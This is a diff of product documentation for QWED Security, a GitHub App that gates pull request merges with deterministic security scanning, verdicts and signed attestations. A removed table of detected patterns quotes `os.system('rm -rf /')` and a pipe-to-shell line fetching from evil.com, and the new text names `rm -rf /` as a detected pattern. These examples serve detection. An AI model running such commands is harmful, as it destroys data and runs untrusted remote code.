@@ -1,130 +1,184 @@
 ---
 title: "QWED Security GitHub App"
-description: "QWED Security GitHub App scans pull requests using formal solvers (SymPy, Z3) and AST analysis to mathematically prove code, math, and logic correctness."
+description: "Deterministic security verification for pull requests: a 20-engine Evidence → Context → Policy pipeline emits a proof-bound Verification Context v1.0 and gates merges on ADMIT. No LLM, no heuristics, fail-closed."
 ---
 
-QWED Security is a **GitHub App** that automatically scans your Pull Requests using deterministic verification engines — not another LLM. It uses formal solvers (SymPy, Z3) and AST analysis to **mathematically prove** that code, math, and logic in your PRs are correct.
+QWED Security is a **GitHub App** that performs deterministic security verification on your pull requests — not another AI code reviewer. A 20-engine **Evidence → Context → Policy** pipeline scans every PR, emits a machine-readable **Verification Context v1.0** with a proof-bound verdict, and fails the check run unless admission is `ADMIT`. Set it as a required check and merges gate on it.
 
 <Tip>
-  **Unlike AI code reviewers that "guess," QWED Security provides deterministic proof. 1\+1 always equals 2.**
+  **Unlike AI reviewers that "guess," QWED Security is deterministic. No LLM, no probabilistic pass logic — unknown states never pass silently.**
 </Tip>
 
 ## How it works
 
 ```text
-Pull Request Opened / Updated
+Pull Request opened / updated
         ↓
-GitHub Webhook → QWED Security App
+GitHub webhook (HMAC-SHA256 verified) → QWED Security
         ↓
-QWEDLocal Verification Engine
-  ├─ 🛡️ Code Security (AST Analysis)
-  ├─ 🧮 Math Verification (SymPy)
-  ├─ ⚖️ Logic Validation (Z3 Prover)
-  └─ 🔒 PII Detection (Regex Patterns)
+Check Run created on the PR
         ↓
-✅ Pass  or  ❌ Fail
+1. EVIDENCE   20 deterministic engines extract findings
+              (AST, taint, patterns, entropy, secrets,
+               manifests, lockfiles, CI/Docker, release packaging)
         ↓
-Results posted as a GitHub Check Run
+2. CONTEXT    each finding classified (RUNTIME_CODE, TEST_CODE,
+              DEMO_CODE, CONFIG, CI_CONFIG, DOCUMENTATION,
+              COMMENT, LITERAL_STRING) — inert code is not
+              treated as executable risk
+        ↓
+3. POLICY     deterministic resolution to BLOCK / WARNING / INFO,
+              fail-closed when context cannot be determined
+        ↓
+Verification Context v1.0 (verdict + admission + SHA-256 proof_ref)
+        ↓
+Check Run conclusion + full VC published as a PR comment
 ```
 
-1. A developer opens or updates a Pull Request
-2. GitHub sends a webhook event to the QWED Security App
+1. A developer opens or updates a pull request
+2. GitHub delivers a webhook event; the signature is verified (HMAC-SHA256)
 3. The app creates a **Check Run** ("QWED Security") on the PR
-4. Files are scanned using `QWEDLocal` — QWED's in-process verification engine
-5. Results are posted directly to the **Checks tab** on the PR
+4. The pipeline runs: evidence extraction → context classification → policy
+5. A **Verification Context v1.0** is emitted: verdict (`VERIFIED` / `UNVERIFIABLE` / `BLOCKED`), admission (`ADMIT` / `DENY`), and a SHA-256 `proof_ref` binding the decision to the exact scan evidence and rule-set version
+6. The check run concludes and the full Verification Context is published as a collapsible PR comment for audit
+
+## The admission contract — what a green check proves
+
+When the QWED Security check passes and you have it configured as a required check, a mergeable PR proves:
+
+- **Full scan** — every file in the PR was scanned by the complete engine set (subject to the [300-file cap](#operational-limits), which is always disclosed in the report when hit)
+- **Zero new blocking findings** — admission is computed from **new** findings only; a PR that introduces no new `BLOCK`/`WARNING` findings gets `VERIFIED (ADMIT)`
+- **Pre-existing debt never blocks** — findings that already exist on the base branch are reported (and listed in the PR comment) but do not affect admission. QWED blocks only what the PR introduces
+- **Rule-set bound in proof** — the rule-set version is part of the SHA-256 `proof_ref`, so the bound under which the verdict was computed is part of the proof
+- **Fail-closed** — unknown context, unparseable manifests, missing evidence, or infrastructure failure never produce a pass. `UNVERIFIABLE` and `BLOCKED` both deny admission
+
+<Warning>
+  A green check means *"VERIFIED against the QWED rule set"*, not *"proven secure in absolute terms"*. The bound is explicit and proof-bound — that is the contract.
+</Warning>
 
 ## What QWED Security catches
 
-### 🛡️ Code security (AST analysis)
-
-Detects dangerous code patterns before they reach production:
-
-| Pattern | Example | Risk |
+| Area | Engines | Examples |
 | --- | --- | --- |
-| Shell injection | `os.system('rm -rf /')` | Remote Code Execution |
-| Eval/Exec | `eval(user_input)` | Arbitrary code execution |
-| Pipe-to-shell | `curl http://evil.com | bash` | Supply chain attack |
-| Hardcoded secrets | `api_key = "sk-proj-..."` | Credential exposure |
-| Unsafe imports | `import subprocess` | Privilege escalation |
+| **Code security** | `python_ast`, `python_deep_ast`, `taint_analysis`, `cross_file_taint`, `js_patterns`, `go_patterns`, `rust_patterns` | `eval`/`exec`, unsafe deserialization, source→sink flows with sanitizer tracking, cross-module taint, XSS, prototype pollution, `unsafe` blocks, TLS skip-verify |
+| **Secrets** | `secret_scan`, `entropy_scan` | Provider-shaped credentials (OpenAI, GitHub, AWS, Stripe…), high-entropy assignments keyword rules miss |
+| **Shell & obfuscation** | `shell_safety`, `codeguard` | `rm -rf /`, pipe-to-shell, setuid; base64 payloads and builtins tampering that survive AST analysis |
+| **Supply chain** | `dependency_scan`, `lockfile_scan` | Unpinned/floating deps, rogue index URLs, missing hashes, `http://` sources, unknown registries |
+| **CI/CD & containers** | `ci_scan`, `docker_scan` | Script injection, `pull_request_target`, permission escalation; root user, `:latest`, remote `ADD`, multi-stage `COPY --from` |
+| **Release boundary** | `release_boundary` | What actually ships in npm / PyPI / Docker artifacts — including secret leakage into release surfaces |
+| **Integrity & policy** | `verification_integrity`, `policy_config`, `consensus` | Trust-boundary anti-patterns (token leaks, disabled guards), malformed repo policy, cross-engine corroboration |
 
-### 🧮 Math verification (SymPy)
-
-Validates mathematical formulas and constants — tax rate calculations, interest/NPV formulas, unit conversions, and financial compliance rules.
-
-### ⚖️ Logic validation (Z3 prover)
-
-Ensures boolean logic and business rules are satisfiable — contract clause contradictions, business rule conflicts, and constraint satisfaction.
-
-### 🔒 PII detection
-
-Detects sensitive data before it enters your codebase — credit card numbers, Social Security Numbers, email addresses, and API keys.
-
-## Installation
-
-1. Visit [QWED Security on GitHub Marketplace](https://github.com/marketplace/qwed-security)
-2. Click **Install**
-3. Select the repositories you want to protect
-4. Done — QWED Security will automatically scan new Pull Requests
-
-<Tip>
-  QWED Security is a **Verified Publisher** on GitHub Marketplace. You can install it directly from the [Marketplace listing](https://github.com/marketplace/qwed-security).
-</Tip>
-
-### Plans
-
-| Plan | Scope | Price |
-| --- | --- | --- |
-| **Free** | Open source & personal repositories | \$0 |
-| **Pro** | Private repositories, priority scanning | Coming soon |
+Math and logic verification (SymPy / Z3) is available through the QWED engine suite and the [QWED GitHub Action](/advanced/github-action); the GitHub App focuses on the security surface above.
 
 ## Check run output
 
-When QWED Security scans a PR, you'll see results directly in the **Checks tab**:
+| Verdict | Admission | Meaning |
+| --- | --- | --- |
+| ✅ `VERIFIED` | `ADMIT` | Full scan, zero new blocking findings — merge allowed |
+| ⚠️ `UNVERIFIABLE` | `DENY` | Evidence incomplete or context undetermined — review required (fail-closed) |
+| ❌ `BLOCKED` | `DENY` | New blocking finding introduced — must fix |
 
-### ✅ All clear
-
-```text
-QWED Verification Report
-
-✅ Verified Files
-✅ math_logic.py: Passed
-✅ api_handler.py: Passed
-```
-
-### ❌ Issues found
+Every scan also posts the full **Verification Context** as a collapsible PR comment:
 
 ```text
-QWED Verification Report
+## QWED Security Verification Report
 
-🚨 Issues Detected
-❌ dangerous.py: SECURITY_RISK
-  > Reason: Forbidden function 'os.system' detected
+5 files scanned | 1 blocked | 0 warnings | 0 info | 0 suppressed | 4 verified | 1 pre-existing
 
-✅ Verified Files
-✅ math_logic.py: Passed
+### Pre-existing Findings (not introduced by this PR — advisory)
+| File | Line | Issue |
+...
+
+### Engines
+- codeguard: ✅   - dependency_scan: ✅   - entropy_scan: ✅
+- pattern_scan: ✅   - python_ast: ✅   - secret_scan: ⚠️ 1 finding(s)
+...
+
+<details><summary>Verification Context v1.0</summary>
+{ "spec_version": "1.0", "object": { "formal_statement": ... },
+  "context": { "proof": { "verifier": "QWED Security", ... } } }
+</details>
 ```
+
+The VC is schema-validated, machine-readable, and suitable for downstream compliance pipelines.
+
+## Cryptographic attestation
+
+`VERIFIED` verdicts are **signed (RS256)** — attestation is the trust gate, not a cosmetic badge:
+
+- The signed JWT is delivered inside the Verification Context at `context.proof.configuration.attestation_token`
+- Third parties verify it against the app's JWKS at `/.well-known/jwks.json` (or the operator-configured `QWED_ATTESTATION_JWKS_URL`): fetch the JWKS, select the key by `kid`, verify the RS256 signature, then check the proof binding in the VC
+- **Rotated signing keys stay published** for the token lifetime plus skew, so unexpired tokens remain verifiable across key rotation
+- Operators can set `QWED_REQUIRE_ATTESTATION=true` to fail closed whenever no signing key is configured — an unsigned `VERIFIED` is never admitted
+
+<Info>
+  The SDK-level ES256 attestation flow for the verification API is documented separately under [Cryptographic attestations](/advanced/attestations). The GitHub App uses the RS256 flow described here.
+</Info>
+
+## Configuration (`.qwed.yml`)
+
+QWED Security works out of the box with zero configuration. Repositories can tune policy with a `.qwed.yml`, loaded from the **base branch — never the PR head**, so a PR cannot weaken its own scan:
+
+```yaml
+ignore_patterns_in_tests: true
+treat_unknown_as_block: true
+diff_aware: true
+allowed_test_patterns: []
+suppressions:
+  - pattern=some-rule-id reason=false-positive path=src/legacy/*
+```
+
+- **`diff_aware`** (default `true`) — admission gating considers new findings only; release-boundary findings always apply
+- **`treat_unknown_as_block`** — unknown context resolves to `BLOCK` (fail-closed)
+- **Suppressions** — maintainer-controlled, with separator-aware `path=` globs: `*` and `?` never cross `/` (`path=tests/*` stays one level deep), `**` spans directories (`path=tests/**` covers everything under `tests/`, and `**/foo.py` also matches a root-level `foo.py`), and the pattern must match the whole path. Malformed globs are rejected when the config loads
+- **Inline suppression** — `# qwed-ignore` or scoped `# qwed-ignore: rule-id` on the offending line
+
+## Operational limits
+
+| Limit | Value | Behavior at the limit |
+| --- | --- | --- |
+| Webhook payload | 10 MB | Oversized payloads rejected (fail-closed) |
+| Files per scan | 300 | Scan truncates; the report states the cap was hit |
+| Webhook redeliveries | deduplicated | A redelivered webhook is not scanned twice |
+| Scan events per installation | rate-windowed | Bounded intake; scans stay claim-deduplicated |
+| Coordination state persistence | fail-closed for claims | A claim that cannot be persisted returns HTTP 500 so GitHub redelivers — an instance-local claim is never granted |
 
 ## Privacy and security
 
-- **No code storage**: Files are analyzed in-memory and discarded
-- **Webhook verification**: HMAC-SHA256 signature validation
-- **JWT authentication**: Short-lived JWT tokens (10-minute expiry)
-- **Open source engines**: All verification logic is Apache 2.0
+- **No code storage** — files are analyzed in memory and discarded
+- **Webhook verification** — HMAC-SHA256 signature validation on every event
+- **JWT authentication** — short-lived installation tokens (10-minute expiry)
+- **Base-branch policy** — `.qwed.yml` is read from the base branch, never the PR head
+- **Fail-closed everywhere** — unknown states deny admission; infrastructure failures never pass silently
+- **Suspended installations** — token minting stops the moment a suspension webhook is processed, across all workers (and across instances when the shared backend is enabled)
 
 ## Permissions
 
 | Permission | Access | Purpose |
 | --- | --- | --- |
-| **Checks** | Read & Write | Create and update Check Runs on PRs |
-| **Pull Requests** | Read | Read PR metadata and trigger scans |
+| **Checks** | Read & Write | Create and update the "QWED Security" Check Run |
+| **Pull Requests** | Read & Write | Read PR metadata and publish the Verification Context report comment |
 | **Contents** | Read | Read repository files for verification |
+| **Metadata** | Read | Implicit GitHub App permission for repository discovery |
 
-## Configuration
+The app never writes to your code, branches, or settings.
 
-QWED Security works out-of-the-box with zero configuration for Python projects. Install the app and it starts scanning PRs immediately.
+## Plans
 
-- **Languages**: Python, Go, Rust, and TypeScript
-- **Trigger**: Pull Request events (opened, synchronized, reopened)
+| Plan | Scope | Price |
+| --- | --- | --- |
+| **Basic** | Open source & personal repositories | \$0 |
+| **Pro** | Private repositories, priority scanning | Coming soon |
+
+Install from the [GitHub Marketplace listing](https://github.com/marketplace/qwed-security).
+
+## Self-hosting and multi-instance deployments
+
+The hosted app runs the default configuration. Self-hosters should note:
+
+- Coordination state (dedup, in-flight claims, rate windows, revocations) is **file-locked and shared by all workers of one instance** by default
+- For Cloud Run scale-out across instances, an optional **Firestore backend** shares that state across every worker and every instance; scan claims fail closed on any backend error
+- See the [self-hosting guide](/advanced/self-hosting) for deployment details
 
 ## QWED Security app vs GitHub Action
 
@@ -133,10 +187,10 @@ QWED Security works out-of-the-box with zero configuration for Python projects. 
 | **Type** | Installed GitHub App | CI/CD Action |
 | **Setup** | One-click install | Add to workflow YAML |
 | **Trigger** | Automatic on PR | Configured in workflow |
-| **Verification** | Code security focus | Math, Logic, Code, SQL |
-| **LLM Required** | No (pure AST analysis) | Optional (for translation) |
+| **Verification** | Security surface: code, secrets, supply chain, release boundary | Math, Logic, Code, SQL |
+| **LLM Required** | No (deterministic engines) | Optional (for translation) |
 
-The GitHub App provides **automatic, zero-config PR scanning**. The GitHub Action provides **configurable verification** within your CI/CD pipeline. They complement each other.
+The GitHub App provides **automatic, zero-config PR security gating**. The GitHub Action provides **configurable verification** within your CI/CD pipeline. They complement each other.
 
 ## Support
 
